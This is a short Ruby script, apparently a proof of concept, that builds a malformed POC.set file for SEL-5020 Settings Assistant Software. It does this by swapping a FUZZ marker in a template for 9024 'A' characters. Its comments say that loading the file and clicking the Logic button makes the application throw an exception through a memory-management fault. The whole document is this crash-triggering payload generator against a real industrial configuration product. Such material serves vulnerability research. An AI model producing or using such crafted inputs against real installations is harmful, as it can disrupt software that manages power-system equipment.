#!/usr/bin/env ruby
# more memory management issues with SEL-5020
# Settings Assistant Software. After loading
# a crafted .set file and clicking the Logic
# button, the application will throw an exception

fd = File.open("FUZZ.set", "rb")
new_set = fd.read(fd.stat.size)
fd.close

data = "A" * 9024

fuzz = new_set

x = File.new("POC.set", "wb")
x.write(fuzz.gsub(/FUZZ/,data))
x.close
